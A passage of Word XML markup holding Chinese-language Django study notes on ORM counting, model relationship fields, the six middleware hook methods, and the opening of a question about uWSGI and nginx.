    <w:p w14:paraId="500BF601" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="295" w:name="2968-1535452670428"/>
      <w:bookmarkEnd w:id="295"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>count 函 数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E960E6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="296" w:name="6653-1535453007294"/>
      <w:bookmarkEnd w:id="296"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作用：统计满足条件数据的数目。例：统计所有图书的数目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15373DE9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="297" w:name="8311-1535452670453"/>
      <w:bookmarkEnd w:id="297"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.all().count()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034ECBEB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="298" w:name="1710-1535453027961"/>
      <w:bookmarkEnd w:id="298"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：统计 id 大于 3 的所有图书的数目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F1B9A9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="299" w:name="4150-1535453037803"/>
      <w:bookmarkEnd w:id="299"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>       BookInfo.objects.filter(id gt = 3).count()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546C4038" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="300" w:name="9433-1535452670513"/>
      <w:bookmarkEnd w:id="300"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模型类关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E87B2E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="301" w:name="7335-1535453107095"/>
      <w:bookmarkEnd w:id="301"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1）一对多关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCA6E74" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="302" w:name="8742-1535453054260"/>
      <w:bookmarkEnd w:id="302"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：图书类-英雄类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFC0A58" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="303" w:name="4721-1535453054260"/>
      <w:bookmarkEnd w:id="303"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>models.ForeignKey() 定义在多的类中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C25A044" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="304" w:name="9986-1535453054260"/>
      <w:bookmarkEnd w:id="304"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2）多对多关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8249C9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="305" w:name="9380-1535453054260"/>
      <w:bookmarkEnd w:id="305"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：新闻类-新闻类型类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0355923E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="306" w:name="5471-1535453054260"/>
      <w:bookmarkEnd w:id="306"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>models.ManyToManyField() 定义在哪个类中都可以。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D80F6C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="307" w:name="4113-1535453054260"/>
      <w:bookmarkEnd w:id="307"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3）一对一关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD44CDE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="308" w:name="5317-1535453054260"/>
      <w:bookmarkEnd w:id="308"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：员工基本信息类-员工详细信息类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E95C80D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="309" w:name="8970-1535453054260"/>
      <w:bookmarkEnd w:id="309"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>models.OneToOneField() 定义在哪个类中都可以。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132867AD" w14:textId="29AA7958" w:rsidR="001C47AF" w:rsidRPr="001C47AF" w:rsidRDefault="0057133E"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10" w:name="1015-1535452670541"/>
      <w:bookmarkStart w:id="311" w:name="6730-1535453123445"/>
      <w:bookmarkEnd w:id="310"/>
      <w:bookmarkEnd w:id="311"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>005</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中间件的使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101E203B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="312" w:name="7753-1535453134628"/>
      <w:bookmarkEnd w:id="312"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 在中间件中预置了六个方法，这六个方法的区别在于不同的阶段执行，对输入或输出进行干预，方法如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC73CBD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="313" w:name="9910-1535453139446"/>
      <w:bookmarkEnd w:id="313"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）初始化：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C721F89" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="314" w:name="9071-1535453159034"/>
      <w:bookmarkEnd w:id="314"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def init ():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7130B4CA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="315" w:name="6686-1535453163483"/>
      <w:bookmarkEnd w:id="315"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>      pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7494AA7B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="316" w:name="1956-1535453182497"/>
      <w:bookmarkEnd w:id="316"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）处理请求前：在每个请求上调用，返回 None 或 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065D2FB1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="317" w:name="1010-1535453203606"/>
      <w:bookmarkEnd w:id="317"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>def process_request(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFB4848" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="318" w:name="6852-1535453211734"/>
      <w:bookmarkEnd w:id="318"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2610C7BA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="319" w:name="6924-1535452670599"/>
      <w:bookmarkEnd w:id="319"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）处理视图前：在每个请求上调用，返回 None 或 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCAEEAD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="320" w:name="8211-1535452670623"/>
      <w:bookmarkEnd w:id="320"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_view(request, view_func, view_args, view_kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40336752" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="321" w:name="1017-1535453255961"/>
      <w:bookmarkEnd w:id="321"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0F9407" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="322" w:name="3026-1535453265407"/>
      <w:bookmarkEnd w:id="322"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）处理模板响应前：在每个请求上调用，返回实现了 render 方法的响应对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AE7ED9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="323" w:name="2283-1535452670689"/>
      <w:bookmarkEnd w:id="323"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_template_response(request, response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38452E6A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="324" w:name="2363-1535453290574"/>
      <w:bookmarkEnd w:id="324"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51125B58" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="325" w:name="7683-1535453276714"/>
      <w:bookmarkEnd w:id="325"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）处理响应后：所有响应返回浏览器之前被调用，在每个请求上调用，返回 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484719B5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="326" w:name="8946-1535453316059"/>
      <w:bookmarkEnd w:id="326"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_response(request, response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB20D51" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="327" w:name="5038-1535453320915"/>
      <w:bookmarkEnd w:id="327"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB5D117" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="328" w:name="6016-1535453331757"/>
      <w:bookmarkEnd w:id="328"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）异常处理：当视图抛出异常时调用，在每个请求上调用，返回一个 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19233214" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="329" w:name="9348-1535453347586"/>
      <w:bookmarkEnd w:id="329"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_exception(request,exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7644F11E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="330" w:name="4142-1535453352451"/>
      <w:bookmarkEnd w:id="330"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE31385" w14:textId="3F6FAB5A"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31" w:name="1215-1535453464192"/>
      <w:bookmarkStart w:id="332" w:name="2912-1535453277100"/>
      <w:bookmarkEnd w:id="331"/>
      <w:bookmarkEnd w:id="332"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>006</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谈一下你对</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> uWSGI </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的理解？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B70A677" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="333" w:name="9067-1535453372859"/>
      <w:bookmarkEnd w:id="333"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1 ）uWSGI 是一个 Web 服务器，它实现了 WSGI 协议、uwsgi、http 等协议。Nginx 中HttpUwsgiModule 的作用是与 uWSGI 服务器进行交换。WSGI 是一种 Web 服务器网关接口。它是一个 Web 服务器（如 nginx，uWSGI 等服务器）与 web 应用（如用 Flask 框架写的程序）通信的一种规范。</w:t>
      </w:r>
    </w:p>
